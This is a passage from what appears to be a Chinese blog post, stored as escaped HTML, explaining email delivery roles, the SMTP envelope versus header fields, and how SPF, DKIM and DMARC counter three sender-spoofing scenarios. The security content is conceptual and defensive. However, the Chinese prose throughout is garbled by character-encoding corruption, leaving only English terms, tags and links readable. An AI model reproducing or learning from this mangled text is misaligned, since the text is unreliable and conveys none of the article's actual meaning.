server ä¸ä¸€å®šæœ‰ MSA é€™å€‹è§’è‰²ï¼Œæœ‰å¯èƒ½æ˜¯ MUA ç›´æ¥æŠŠä¿¡é€åˆ° port 25 çš„ MTA ï¼ˆæ­¤æ™‚ MTA å…¼è²  MSA çš„è·è²¬ï¼‰ã€‚</p>\n<p>å‰é¢èªªéï¼Œä½¿ç”¨ SMTP æœƒæŠŠä¿¡åŒ…åœ¨ä¸€å€‹ä¿¡å°è¢‹ï¼ˆSMTP envelopeï¼‰ä¸­ï¼Œå¯¦éš›ä¸Šä¹Ÿå°±æ˜¯åŠ ä¸Šä¸€äº› SMTP æ¬„ä½çš„ç´€éŒ„ï¼Œä¾‹å¦‚ <code>smtp.HELO</code>ã€<code>smtp.MailFrom</code>ã€<code>smtp.RcptTo</code> ç­‰ç­‰ã€‚æ‰€ä»¥ç¶“é MSA èˆ‡ MTA é€™äº› relay çš„ä¿¡ä»¶éƒ½æœƒè¢«åŠ ä¸Šä¸€äº›è»Œè·¡ï¼ˆtraceï¼‰ï¼Œä½ å¯ä»¥åœ¨åŸå§‹è³‡è¨Šä¸­çœ‹è¦‹é€™äº›ç´€éŒ„ï¼š</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/trace.png\" /><figcaption><p>SMTP trace information</p>\n</figcaption></figure></p>\n<p>å¥½ä¸å®¹æ˜“é€åˆ°ä½¿ç”¨ outlook çš„çˆºçˆºé‚£é‚Šçš„ Microsoft serverï¼Œç„¶å¾Œå‘¢ï¼Ÿ</p>\n<p>é¦–å…ˆï¼ŒMTA æ”¶åˆ°ä¿¡å¾Œä¸€çœ‹ï¼Œç™¼ç¾è‡ªå·±å°±æ˜¯æœ€çµ‚ç›®çš„åœ°ï¼Œæ–¼æ˜¯æŠŠä¿¡è½‰åˆ°åŒå°ä¸»æ©Ÿä¸Šçš„ Mail Delivery Agentï¼ˆMDAï¼‰ï¼Œåˆç¨±ç‚º Local Delivery Agentï¼ˆLDAï¼‰ã€‚MDA çš„è§’è‰²å°±åƒæ”¶åˆ°ä¸€å¤§å †ä¿¡ä»¶çš„ç¤¾å€ç®¡ç†ä¸­å¿ƒï¼Œè² è²¬æŠŠä¿¡ä»¶åˆ†é¡å¥½ä¸¦å¡åˆ°æ¯å€‹ä½æˆ¶çš„ä¿¡ç®±è£¡ï¼Œé€™è£¡èªªçš„ä¿¡ç®±æ˜¯åœ¨ email server ä¸Šçš„ä¿¡ä»¶å„²å­˜ç©ºé–“ Message Storeï¼ˆMSï¼‰ã€‚åŒæ™‚ï¼ŒMDA ä¹ŸæœƒåŠ ä¸Šä¸€ç­† SMTP traceï¼Œä¸¦æŠŠä¿¡å°è¢‹ä¸Šçš„ <code>smtp.MailFrom</code> æ¬„ä½æ”¾åˆ° header ä¸­çš„ <code>Return-Path</code> æ¬„ä½ã€‚</p>\n<p>æœ€å¾Œï¼Œç•¶çˆºçˆºæ‰“é–‹ä»–çš„æ¡Œæ©Ÿç‰ˆ outlook ï¼ˆMUAï¼‰æº–å‚™æ”¶ä¿¡æ™‚ï¼ŒMUA å°±æœƒä½¿ç”¨ POP3 æˆ–æ˜¯ IMAP å”å®šå‘ email server ä¸Šé‹è¡Œçš„ POP3 / IMAP server é€²è¡Œèº«ä»½é©—è­‰ä¸¦è¦æ±‚å­˜å–ä¿¡ä»¶ï¼Œå¦‚æœé©—è­‰æˆåŠŸå°±æœƒå¾ MS ä¸­ä¸‹è¼‰æˆ‘çµ¦çˆºçˆºçš„ä¿¡ï¼Œé€™æ¨£çˆºçˆºå°±èƒ½åœ¨ outlook çš„ä»‹é¢ä¸Šçœ‹åˆ°æˆ‘çš„è³€å¡å•¦ï½</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/journey.png\" alt=\"mail's journey\"/><figcaption><p>Emailâ€™s journey ï¼ˆåƒè€ƒ <a href=\"https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc\">Mail Terminology</a>ï¼‰</p>\n</figcaption></figure></p>\n<p>è‡³æ­¤æˆ‘å€‘é…è‘—åœ–ç¨å¾®æ•´ç†ä¸€ä¸‹é€™è¶Ÿæ—…ç¨‹ä¸­çš„å„å€‹è§’è‰²ï¼š</p>\n<ul>\n<li>Mail <strong>User</strong> Agentï¼ˆMUAï¼‰ï¼šä¿—ç¨±çš„ email clientï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨è€…ä»‹é¢ï¼Œèƒ½è®“æˆ‘å€‘ç·¨è¼¯ã€ç€è¦½ã€æ¨™è¨˜ã€åˆ†é¡ä¿¡ä»¶ç­‰ã€‚è»Ÿé«”æœ‰ï¼šGmailã€Hotmailã€Outlookã€Thunderbird ç­‰ã€‚</li>\n<li>Mail <strong>Submission</strong> Agentï¼ˆMSAï¼‰ï¼šå¯„å‡ºå‰å°‡ MUA é€ä¾†çš„ä¿¡é€²è¡Œå¯©æŸ¥èˆ‡å‹˜èª¤ã€‚ä¸ä¸€å®šæœ‰å°ˆè²¬è»Ÿé«”ï¼Œæœ‰äº› MTA å…¼æœ‰ MSA çš„åŠŸèƒ½ã€‚</li>\n<li>Mail <strong>Transfer</strong> Agentï¼ˆMTAï¼‰ï¼šè² è²¬ä¿¡ä»¶çš„ã€è·¯ç”±ã€ï¼Œæœ‰æ™‚åˆç¨±ç‚º mail relayã€mail exchangerã€MX host ç­‰ã€‚è»Ÿé«”æœ‰ï¼šPostfixã€Eximã€Sendmailã€qmailã€Postalã€Cuttlefish ç­‰ã€‚</li>\n<li>Mail <strong>Delivery</strong> Agentï¼ˆMDAï¼‰ï¼šå°‡ MTA å‚³ä¾†çš„ä¿¡ä»¶æ”¾åˆ° email serverä¸Šçš„ä¿¡ç®±å„²å­˜ç©ºé–“ã€‚è»Ÿé«”æœ‰ï¼šCyrus IMAPã€dovecotã€fetchmailã€sieveã€courier-maildropã€getmail ç­‰ã€‚</li>\n<li>Message Storeï¼ˆMSï¼‰ï¼šå„²å­˜ä¿¡ä»¶çš„åœ°æ–¹ï¼Œå¯èƒ½ç‚ºé ç«¯ï¼ˆremoteï¼‰æˆ–æœ¬åœ°ç«¯ï¼ˆlocalï¼‰ï¼Œä¹Ÿå¯èƒ½æœ‰å¤šå€‹å…±åŒé‹ä½œã€‚</li>\n</ul>\n<hr>\n<h2 id=\"%E9%80%99%E9%BA%BC%E5%A4%9A%E6%AC%84%E4%BD%8D%E5%B7%AE%E5%9C%A8%E5%93%AA%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%80%99%E9%BA%BC%E5%A4%9A%E6%AC%84%E4%BD%8D%E5%B7%AE%E5%9C%A8%E5%93%AA%EF%BC%9F\">#</a> é€™éº¼å¤šæ¬„ä½å·®åœ¨å“ªï¼Ÿ</h2>\n<p>è¬›åˆ°é€™è£¡ï¼Œå¾ˆå¤šäººæœƒå›°æƒ‘åˆ°åº•å‰é¢èªªçš„ä¿¡ç´™ï¼ˆ<code>header.From, header.To</code>ï¼‰èˆ‡ä¿¡å°è¢‹ï¼ˆ<code>smtp.MailFrom, smtp.RcptTo</code>ï¼‰ä¸Šçš„æ¬„ä½æœ‰ä½•ä¸åŒï¼Ÿä¸å°±éƒ½æ˜¯å¯«è‘—ä¸€æ¨£çš„ä¿¡ç®±ä½ç½®å—ï¼Ÿ</p>\n<p>å…¶å¯¦ï¼Œä¿¡ç´™è·Ÿä¿¡å°è¢‹ä¸Šçš„å¯„ä¿¡äººæ¬„ä½æ˜¯å¯ä»¥ä¸åŒçš„ï¼</p>\n<p>åœ¨ SMTP å”è­°ä¸‹ï¼Œ<code>smtp.MailFrom</code> é€™å€‹æ¬„ä½å…¶å¯¦æœ‰ä¸€å€‹é‡è¦åŠŸèƒ½ï¼Œå°±æ˜¯æŒ‡ç¤º MTA å¦‚æœé€™å°ä¿¡å¯„é€å¤±æ•—çš„è©±ï¼Œè¦é€€ä»¶åˆ°å“ªå€‹åœ°å€å»ï¼Œæ‰€ä»¥åˆç¨±ç‚º bounce addressã€‚ä¸€èˆ¬ä¾†èªªå¦‚æœæ˜¯å€‹äººå¯„ä¿¡çš„è©±ï¼Œå¤±æ•—ç•¶ç„¶å°±æ˜¯ç›´æ¥å›çµ¦å¯„ä»¶äººï¼Œæ­¤æ™‚ <code>header.From = smtp.MailFrom</code>ï¼Œä¸éå¦‚æœæ˜¯å…¬å¸æˆ–æ˜¯ç¶²ç«™çš„ mailing list é€™ç¨®è‡ªå‹•åŒ–å¯„ä¿¡çµ¦è¨‚é–±è€…çš„æ‡‰ç”¨å ´æ™¯ï¼Œæœ‰æ™‚æœƒå¸Œæœ›æŠŠå‚³é€å¤±æ•—çš„ä¿¡çµ±ä¸€é›†ä¸­åˆ°å¦ä¸€å€‹ä¿¡ç®±è™•ç†ã€‚å¦ä¸€ç¨®æƒ…å¢ƒæ˜¯ï¼Œç•¶ä¿¡ä»¶æœƒç¶“éä¸€å€‹ä¸­ç¹¼ email server ç„¶å¾Œè¢«è‡ªå‹•è½‰ç™¼ï¼ˆForwardï¼‰æ™‚ï¼Œ<code>header.From</code> æœƒæ˜¯åŸå§‹ä¿¡ä»¶çš„å¯„ä»¶äººï¼Œä½† <code>smtp.MailFrom</code> æœƒæ˜¯ä¸­ç¹¼ email server ä¸€å€‹å°ˆæ”¶å ±éŒ¯çš„ä¿¡ç®±ï¼Œç•¢ç«Ÿä½ å¯ä¸å¸Œæœ›è½‰ç™¼éŒ¯èª¤è¢«å ±éŒ¯åˆ°åŸå§‹å¯„ä»¶äººé‚£å…’å•Šï¼</p>\n<blockquote>\n<p>SMTP æ¬„ä½åªæœ‰åœ¨ä»¥ SMTP æºé€šçš„è§’è‰²ä¹‹é–“æ‰æœƒä½¿ç”¨ï¼Œæˆ‘å€‘åœ¨ MUA ä»‹é¢ä¸Šçœ‹åˆ°çš„å¯„ä¿¡äººç­‰è³‡æ–™éƒ½æ˜¯æ”¾åœ¨ headerÂ ä¸­çš„ã€‚</p>\n</blockquote>\n<p>ä½ å¯ä»¥æƒ³åƒæˆï¼Œä¿¡ç´™æ˜¯çµ¦æ”¶ä¿¡äººï¼ˆçˆºçˆºï¼‰çœ‹çš„ï¼Œä½†ä¿¡å°è¢‹æ˜¯çµ¦éƒµæ”¿äººå“¡ï¼ˆMxAï¼‰çœ‹çš„ï¼Œæ‰€ä»¥ä¿¡å°è¢‹ä¸Šçš„è¨»è¨˜ç•¶ç„¶éƒ½ä¸æœƒè®“çˆºçˆºçœ‹åˆ°å›‰ï¼</p>\n<p>é—œæ–¼ email çš„å„ç¨®å®šç¾©å¯ä»¥åœ¨ <a href=\"https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users\">Internet Mail Architecture</a> è©³ç´°é–±è®€ï¼Œé€™è£¡ä¹Ÿé™„ä¸Š RFC å®šç¾©çš„æ¬„ä½åˆ—è¡¨ï¼š</p>\n<ul>\n<li>originatorï¼šæŒ‡çš„æ˜¯ä½œè€…ï¼ˆauthorï¼‰ï¼Œåœ¨ä¸Šé¢æµç¨‹ä¸­å°±æ˜¯å¯«ä¿¡çš„æˆ‘</li>\n<li>relayï¼šè² è²¬ä¿¡ä»¶è·¯ç”±èˆ‡å‚³é€çš„éƒµå·®ï¼Œé€šå¸¸æŒ‡ MTA</li>\n<li>sourceï¼šåœ¨å®šç¾©ä¸Šç‚ºã€è² è²¬ç¢ºä¿ä¿¡ä»¶æœ‰æ•ˆï¼ˆvalidï¼‰å†äº¤çµ¦ relay ã€çš„è§’è‰²ï¼Œå³ MUA èˆ‡ MSA</li>\n<li>mediatorï¼šæŒ‡ user-level çš„ä¿¡ä»¶å‚³é€ï¼Œå¦‚ mailing list é€™ç¨®è‡ªå‹•è½‰ç™¼çš„ä¸­é–“äººè§’è‰²ï¼Œæˆ–æ˜¯ MDA æ‰€æ”¯æ´çš„ aliasing åŠŸèƒ½ã€‚èˆ‡ MTA relay æ©Ÿåˆ¶ä¸åŒã€‚</li>\n</ul>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/identity-ref.png\" /><figcaption><p>Identity Referencesï¼ˆFrom: <a href=\"https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users\">Internet Mail Architecture</a>ï¼‰</p>\n</figcaption></figure></p>\n<hr>\n<h2 id=\"%E9%82%A3%E6%94%BB%E6%93%8A%E6%98%AF%E5%A6%82%E4%BD%95%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%82%A3%E6%94%BB%E6%93%8A%E6%98%AF%E5%A6%82%E4%BD%95%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\">#</a> é‚£æ”»æ“Šæ˜¯å¦‚ä½•ç™¼ç”Ÿçš„ï¼Ÿ</h2>\n<p>è¨è«–æ”»æ“Šå‰è«‹è¨˜ä½ï¼Œ</p>\n<blockquote>\n<p>SMTP å°ä¿¡ä»¶æœ¬èº«æ˜¯æ²’æœ‰ä»»ä½•é©—è­‰æ©Ÿåˆ¶çš„ã€‚</p>\n</blockquote>\n<p>ä½ åªè¦å¯ä»¥ç”¨ä¸€çµ„å¸³è™Ÿå¯†ç¢¼ç™»å…¥ SMTP serverï¼Œå¯„ä¿¡æ”¶ä¿¡äººæ¬„ä½éƒ½ä»»ä½ å¡«ã€‚SMTP authentication åªæ˜¯ç‚ºäº†ä¿è­· SMTP server ä¸è¦æˆç‚º open relay è®“ä»»ä½•äººéƒ½èƒ½ä½¿ç”¨ï¼Œä¸¦æ²’æœ‰ä¿éšœä¿¡ä»¶æœ¬èº«çš„çœŸå¯¦æ€§ã€‚</p>\n<p>å›é¡§ä¸Šé¢çš„æµç¨‹ï¼Œæˆ‘å€‘ä¾†è¨è«–ä¸‰ç¨®æƒ…å¢ƒã€çœ‹çœ‹é€™äº›æ”»æ“Šä¸­çš„ã€ä¿¡ä»¶ã€æœ‰ä½•ä¸åŒã€‚</p>\n<p>å…ˆå‡è¨­</p>\n<ul>\n<li>æˆ‘ä½¿ç”¨çš„ä¿¡ç®±æ˜¯ï¼šgoodboy@gmail.com</li>\n<li>æˆ‘çš„ email server ç¶²åŸŸæ˜¯ï¼š<a href=\"http://gmail.com\">gmail.com</a></li>\n<li>çˆºçˆºç”¨çš„ä¿¡ç®±æ˜¯ï¼šgrandpa@outlook.com</li>\n<li>çˆºçˆºçš„ email server ç¶²åŸŸæ˜¯ï¼š<a href=\"http://outlook.com\">outlook.com</a></li>\n</ul>\n<p>å› æ­¤æˆ‘å¯„å‡ºçš„ä¿¡ä»¶ä¸Šï¼Œä¿¡ç´™ï¼ˆ<code>header.From</code>ï¼‰èˆ‡ä¿¡å°è¢‹ï¼ˆ<code>smtp.MailFrom</code>ï¼‰ä¸Šéƒ½æœƒå¯«è‘— <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a>ã€‚</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80\">#</a> æƒ…å¢ƒä¸€</h3>\n<p>ä»Šå¤©æˆ‘çš„æœˆå…‰æ—è¡¨å¼Ÿæƒ³è¦æ¨¡ä»¿æˆ‘å¯„ä¿¡çµ¦çˆºçˆºè·Ÿä»–è¦é›¶ç”¨éŒ¢ï¼Œä»–å¯ä»¥è‡ªå·±æ¶èµ·ä¸€å€‹ email serverï¼Œç„¶å¾Œå½é€ ä¸€å°ä¿¡ç´™ï¼ˆ<code>header.From</code>ï¼‰èˆ‡ä¿¡å°è¢‹ï¼ˆ<code>smtp.MailFrom</code>ï¼‰ä¸Šå‡å¯«è‘— <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a> çš„ä¿¡ä»¶ä¸¦å¯„å‡ºã€‚çˆºçˆºçš„ email server çœ‹åˆ°é€™å°ä¿¡ä¸ç–‘æœ‰ä»–å°±é€é€²çˆºçˆºçš„ä¿¡ç®±è£¡ï¼Œå°è‡´çˆºçˆºæˆåŠŸè¢«é¨™ï¼Œè½‰äº†ä¸€ç­†éŒ¢çµ¦è¡¨å¼Ÿã€‚å–®ç´”å¾ SMTP æ©Ÿåˆ¶ä¾†çœ‹ï¼Œ<a href=\"http://outlook.com\">outlook.com</a> çœ¼ä¸­çš„ä¿¡ä»¶å¯«è‘—ä¾†è‡ª <a href=\"http://gmail.com\">gmail.com</a>ï¼Œé‚£å°±å§‘ä¸”ç›¸ä¿¡ä»–ï¼</p>\n<p>ç‚ºäº†é˜²ç¯„é€™ç¨®å‡å†’å¯„ä¿¡äººçš„æ”»æ“Šï¼Œ2014 å¹´ 4 æœˆ RFC 7208 æ­£å¼æå‡ºä¸€å¥—åç‚º <strong>Sender Policy Frameworkï¼ˆSPFï¼‰</strong> çš„é›»å­éƒµä»¶é©—è­‰æ©Ÿåˆ¶ã€‚é€™å€‹æ©Ÿåˆ¶çš„åŸç†å°±æ˜¯è¦æ±‚æ¯å€‹ç¶²åŸŸç™¼ä¸€ç­† DNS ç´€éŒ„ï¼Œå…¶ä¸­è¨˜è¼‰è‘—é€™å€‹ç¶²åŸŸæ‰€æˆæ¬Šçš„ email server çš„ IP ä½ç½®ï¼Œä¹Ÿå°±æ˜¯</p>\n<blockquote>\n<p>SPFï¼šæ˜­å‘Šå¤©ä¸‹ã€é€™äº› IP ä½ç½®æ˜¯æˆ‘ä¿¡ä»»ä¸”æ ¸å¯çš„ä¿¡ä»¶ä¾†æºã€</p>\n</blockquote>\n<p>ç•¶æ”¶ä»¶æ–¹ email server è¦é€²è¡Œé©—è­‰æ™‚ï¼ŒMDA å°±æœƒå»æŸ¥è©¢ <code>smtp.MailFrom</code>é€™å€‹ç¶²åŸŸçš„ DNS ç´€éŒ„ï¼Œç„¶å¾Œæª¢æŸ¥æ­¤ä¿¡ä»¶çš„ä¾†æº IP æ˜¯å¦åœ¨ SPF ç´€éŒ„ä¸­ã€‚</p>\n<p>ä¸‹åœ–æ˜¯ä¸€ç­†åˆæ³•çš„ SPF ç´€éŒ„ï¼Œè£¡é¢è¡¨åˆ—äº†å…è¨±å¯„ä¿¡çš„ IP ä½ç½®ï¼Œä¸¦ä¸”ç”¨ -all å®£å‘Šã€é™¤äº†å‰åˆ— IP ä¹‹å¤–ä¸€å¾‹æ‹’çµ•ã€ã€‚å…¶å¯¦ SPF æœ‰éå¸¸å¤šç¨®è¨­å®šï¼Œæˆ‘å€‘ä¸‹ä¸€ç¯‡å†è«‡ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/spf.png\" /><figcaption><p>SPF recordï¼ˆå–è‡ª ç¶­åŸºç™¾ç§‘ï¼‰</p>\n</figcaption></figure></p>\n<p>ä½ å¯ä»¥åœ¨ä¿¡ä»¶çš„åŸå§‹è³‡è¨Šè£¡çœ‹åˆ° SPF çš„é©—è­‰çµæœï¼Œæ”¶ä¿¡æ–¹çš„ email serverï¼ˆ<a href=\"http://protection.outlook.com\">protection.outlook.com</a>ï¼‰åœ¨ç¢ºå®š IP ç‚ºæ­¤ domain çš„åˆæ³•å¯„ä¿¡äººå¾Œï¼Œå°±æœƒçµ¦å‡º PASS çš„çµæœã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/spf-result.png\" /><figcaption><p>SPF é©—è­‰çµæœ</p>\n</figcaption></figure></p>\n<p>å¦‚æœä»Šå¤© <a href=\"http://gmail.com\">gmail.com</a> è¨­ç½®äº† SPF ç´€éŒ„ï¼Œé‚£çˆºçˆºçš„ email server åœ¨é©—è­‰æ™‚å°±æœƒç™¼ç¾è¡¨å¼Ÿæ‰€ç”¨çš„è‡ªæ¶ email server æ²’æœ‰åœ¨åˆ—è¡¨è£¡æ‰¾åˆ°å°æ‡‰çš„ IP ï¼Œå› æ­¤åˆ¤æ–·ç‚ºé©—è­‰å¤±æ•—ï¼ŒæˆåŠŸæ“‹ä¸‹é€™å€‹è©é¨™æ”»æ“Šã€‚</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C\">#</a> æƒ…å¢ƒäºŒ</h3>\n<p>è¡¨å¼Ÿç™¼ç¾æ”»æ“Šå¤±æ•—ï¼Œåªå¥½å¦å°‹ä»–æ³•ã€‚ä»–éˆå…‰ä¸€é–ƒï¼Œç™¼ç¾é›–ç„¶ä¸èƒ½å‡å†’ <a href=\"http://gmail.com\">gmail.com</a> å¯„ä¿¡ï¼Œé‚£ä»–å¯ä»¥æ””æˆªæˆ‘å¯„çµ¦çˆºçˆºçš„ä¿¡ï¼Œç„¶å¾ŒæŠŠè£¡é¢çš„æ¬„ä½è·Ÿè³‡è¨Šæ”¹æ‰ï¼Œé€™æ¨£å°±å¯ä»¥å†’å……æˆ‘çš„èº«ä»½åˆé€šé SPF é©—è­‰å•¦ï¼æ–¼æ˜¯è¡¨å¼Ÿç«„æ”¹æˆ‘çš„ä¿¡ä»¶ï¼ŒæŠŠå…§å®¹æ”¹æˆé›¶ç”¨éŒ¢è«‹æ±‚ï¼ŒåˆæˆåŠŸé¨™åˆ°çˆºçˆºäº†ã€‚</p>\n<p>ç‚ºäº†é˜²ç¯„æƒ…å¢ƒäºŒçš„é€™ç¨®æ”»æ“Šï¼Œ2011 å¹´é¦–æ¬¡æå‡ºçš„ RFC 6376ï¼ˆå¾Œä¾†åˆåœ¨ RFC 8301 èˆ‡ RFC 8463 ä¿®è¨‚ï¼‰å®šç¾©äº† <strong>DomainKeys Identified Mailï¼ˆDKIMï¼‰</strong> é€™å€‹æ©Ÿåˆ¶ã€‚</p>\n<blockquote>\n<p>DKIMï¼šä½¿ç”¨æ•¸ä½ç°½ç« çš„æ¦‚å¿µä¾†é˜²æ­¢éƒµä»¶å½é€ èˆ‡ç«„æ”¹ï¼Œé€éå…¬ç§é‘°åŠ å¯†é©—è­‰çš„ç‰¹æ€§ä¾†ç¢ºä¿è¨Šæ¯çš„å®Œæ•´èˆ‡çœŸå¯¦æ€§ã€‚</p>\n</blockquote>\n<p>å¯„ä¿¡æ–¹çš„ email server æœƒç”¢ç”Ÿä¸€çµ„å…¬ç§é‘°ï¼Œå…¬é‘°æœƒç”¨ DNS ç´€éŒ„ç™¼ä½ˆå‡ºå»è®“æ”¶ä¿¡æ–¹å¯ä»¥ç”¨ä¾†è§£å¯†ã€‚åœ¨å¯„ä¿¡æ™‚ä½¿ç”¨ç§é‘°åŠ å¯† header çš„æŸäº›æ¬„ä½èˆ‡ bodyï¼Œä¸¦å°‡ç”¢ç”Ÿçš„é›œæ¹Šï¼ˆhashï¼‰åšç‚ºç°½ç« é™„ä¸Šï¼Œæ­¤ç°½ç« ç¨±ç‚º DKIM signatureã€‚è¦åŠ å¯†çš„æ¬„ä½ç”± email server æŒ‡å®šï¼Œä¸éå¿…é ˆåŒ…å« <code>header.From</code>ï¼ˆå¦å‰‡å¯„ä»¶äººçš„èº«ä»½å°±æ²’æœ‰ä¿éšœå•¦ï¼‰ã€‚</p>\n<p>æ”¶ä¿¡çš„ email server é€²è¡Œé©—è­‰æ™‚ï¼Œå¦‚åŒ SPFï¼ŒMDA æœƒå»æŸ¥è©¢å¯„ä¿¡ç¶²åŸŸçš„ DNS ç´€éŒ„ï¼Œæ‰¾åˆ°å°æ‡‰çš„å…¬é‘°å¾Œè§£å¯†ç°½ç« å…§å®¹ä¾†æ¯”å°æ˜¯å¦ä¸€è‡´ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dkim.png\" /><figcaption><p>å…¬é‘°ï¼ˆå–è‡ª ç¶­åŸºç™¾ç§‘ï¼‰</p>\n</figcaption></figure></p>\n<p>ç°½ç« å¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œæ¨™ç±¤ä¸­ <code>v</code> ç‚ºç‰ˆæœ¬ã€<code>a</code> ä»£è¡¨åŠ å¯†æ–¹å¼ã€‚<code>d</code> <code>s</code> <code>q</code> ä¸‰è€…ä¸€èµ·ç”¨ä¾†æŸ¥è©¢å…¬é‘°ï¼Œè¡¨ç¤ºæŸ¥è©¢åŸŸåç‚º <code>&lt;selector&gt;._domainkey.&lt;domain&gt;</code>ï¼ˆåœ–ä¸­å°±æ˜¯ <code>brisbane._domainkey.example.net</code>ï¼‰çš„ DNS TXT ç´€éŒ„ã€‚<code>h</code> ä»£è¡¨æŒ‡å®šçš„header æ¬„ä½ï¼ŒåŠ å¯†å¾Œçš„çµæœæœƒæ”¾åœ¨ <code>b</code>ï¼Œè€Œ <code>bh</code>ï¼ˆbody hashï¼‰å‰‡æ˜¯ body æœ¬èº«ç¶“éé›œæ¹Šå¾Œçš„çµæœã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dkim-signature.png\" /><figcaption><p>DKIM signatureï¼ˆå–è‡ª ç¶­åŸºç™¾ç§‘ï¼‰</p>\n</figcaption></figure></p>\n<p>å¦‚æœä»Šå¤© <a href=\"http://gmail.com\">gmail.com</a> è¨­ç½®äº† DKIM ç´€éŒ„ï¼Œé‚£çˆºçˆºçš„ email server åœ¨é©—è­‰æ™‚å°±æœƒç™¼ç¾è¡¨å¼Ÿç«„æ”¹å®Œçš„ä¿¡ä»¶è·Ÿæ•¸ä½ç°½ç« è§£å¯†çš„çµæœä¸ç¬¦ï¼Œå› æ­¤åˆ¤æ–·ç‚ºé©—è­‰å¤±æ•—ï¼Œçˆºçˆºå†åº¦é€ƒè„«è¡¨å¼Ÿçš„æš—ç®—ã€‚</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89\">#</a> æƒ…å¢ƒä¸‰</h3>\n<p>è¡¨å¼Ÿæ‹¿ä¸åˆ°é›¶ç”¨éŒ¢ï¼Œå¾ˆæ˜¯æŒ«æ•—ã€‚æ–¼æ˜¯ä»–çµç›¡è…¦æ±çµ‚æ–¼æƒ³åˆ°ï¼šæ—¢ç„¶æˆ‘ä¸èƒ½ä»¿å†’ <a href=\"http://gmail.com\">gmail.com</a> ä¹Ÿä¸èƒ½æ””æˆªçœŸçš„ä¿¡ä»¶ï¼Œé‚£æˆ‘å°±è‡ªå·±æ¶ä¸€å€‹ email serverã€ç”³è«‹ä¸€å€‹åˆæ³•ç¶²åŸŸ <a href=\"http://cousin.com\">cousin.com</a> ï¼Œç„¶å¾Œå¯„ä¸€å°ä¿¡ç´™ï¼ˆ<code>header.From</code>ï¼‰ä¸Šå¯« <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a> çš„ä¿¡çµ¦çˆºçˆºå°±å¥½å•¦ï¼é›–ç„¶ä¿¡å°è¢‹ï¼ˆ<code>smtp.MailFrom</code>ï¼‰ä¸Šå¯«çš„æ˜¯ <a href=\"http://cousin.com\">cousin.com</a>ï¼Œä½†åæ­£çˆºçˆºåœ¨ outlook è£¡çœ‹åˆ°çš„ä¹Ÿåªæœ‰ <code>header.From</code>ï¼Œä»–å“ªçŸ¥é“ä¸æ˜¯çœŸçš„å¾ <a href=\"http://gmail.com\">gmail.com</a> ä¾†çš„ã€‚è€Œä¸”ï¼Œä¸ç®¡æ˜¯ SPF é‚„æ˜¯ DKIM é©—è­‰çš„éƒ½æ˜¯ <code>smtp.MailFrom</code> çš„ç¶²åŸŸï¼Œæˆ‘æœ¬ä¾†å°±æ˜¯ <a href=\"http://cousin.com\">cousin.com</a> åˆæ²’é€ å‡ï¼Œä¼‘æƒ³æ“‹æˆ‘è²¡è·¯ï¼</p>\n<p>å“å‘€ï¼Œè¡¨å¼Ÿæƒ³çš„çœŸæœ‰é“ç†ã€‚</p>\n<p>ä¸éå¥½åœ¨ 2015 å¹´ 3 æœˆæ™‚ RFC 7489 å‡ºç¾ï¼Œæå‡ºäº†ä¸€å€‹å¯ä»¥ä¿è­·çˆºçˆºçš„æ–¹æ³•ï¼Œåç‚º <strong>Domain-based Message Authentication, Reporting and Conformanceï¼ˆDMARCï¼‰</strong></p>\n<blockquote>\n<p>DMARC çµåˆäº† SPF èˆ‡ DKIMï¼Œå½¢æˆä¸‰äººè¯é˜²ï¼Œç¼ºä¸€ä¸å¯ï¼ŒåŒæ™‚å¼·åŒ–ä¿¡ç´™èˆ‡ä¿¡å°è¢‹çš„ä¸€è‡´æ€§ã€‚</p>\n</blockquote>\n<p>DMARC ä¸»è¦æœ‰å…©å€‹åŠŸèƒ½ï¼Œå…¶ä¸€æ˜¯æŒ‡ç¤ºäº†ç•¶ SPF èˆ‡ DKIM é©—è­‰å¤±æ•—æ™‚è©²æ¡å–çš„è¡Œç‚ºï¼Œç¨±ç‚º policyï¼›ç¬¬äºŒå‰‡æ˜¯ç¢ºä¿ä¿¡ç´™èˆ‡ä¿¡å°è¢‹ä¸Šæ¨™ç¤ºçš„å¯„ä»¶äººä¾†è‡ªåŒä¸€å€‹ç¶²åŸŸï¼ˆä¹Ÿå°±æ˜¯æ¯”å°<code>header.From</code>è·Ÿ<code>smtp.MailFrom</code>ï¼‰ï¼Œç¨±ç‚º alignmentã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/dmarc.png\" /><figcaption><p>DMARC recordï¼ˆå–è‡ª <a href=\"http://bbc.com\">bbc.com</a> çš„ç´€éŒ„ï¼‰</p>\n</figcaption></figure></p>\n<p>ä»¥ä¸Šé¢é€™å€‹ DMARC ç´€éŒ„ç‚ºä¾‹ï¼Œå¿…è¦çš„æ¨™ç±¤ç‚º <code>p</code>ï¼ˆpolicyï¼‰ï¼Œå¯èƒ½çš„å€¼æœ‰ï¼š</p>\n<ul>\n<li><code>reject</code>ï¼šæœ€åš´æ ¼çš„è¨­å®šï¼Œè¡¨ç¤º SPF èˆ‡ DKIM 